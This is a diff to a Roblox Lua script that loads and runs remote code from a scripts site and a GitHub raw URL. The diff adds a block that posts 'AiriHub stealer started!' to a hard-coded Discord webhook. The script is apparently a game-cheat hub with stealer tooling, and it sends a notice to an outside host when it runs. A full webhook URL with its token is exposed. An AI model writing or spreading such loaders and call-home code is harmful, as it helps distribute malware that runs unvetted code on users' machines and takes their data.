@@ -1,3 +1,23 @@
 getgenv().SS={ID="CoephTiLN9-S5KNUfN0w7D-b5sfmzq7E"};loadstring(game:HttpGet("https://star-scripts.com/api/loader"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skibidibitch352-cell/Airiiii.woowwwwe/refs/heads/main/HubAiri"))()
+
+local HttpService = game:GetService("HttpService")
+
+local webhook = "https://discord.com/api/webhooks/1561753742699790446/17xkM2Noatu3fxx-TQs_1qGBAUR1V3ogqHm0m4cAfKC0HKmXUcZRZTtgFAPQxwDZYmxl"
+
+local payload = {
+    content = "✅ AiriHub stealer started!"
+}
+
+local success, err = pcall(function()
+    HttpService:PostAsync(
+        webhook,
+        HttpService:JSONEncode(payload),
+        Enum.HttpContentType.ApplicationJson
+    )
+end)
+
+if not success then
+    warn("Discord notification failed:", err)
+end
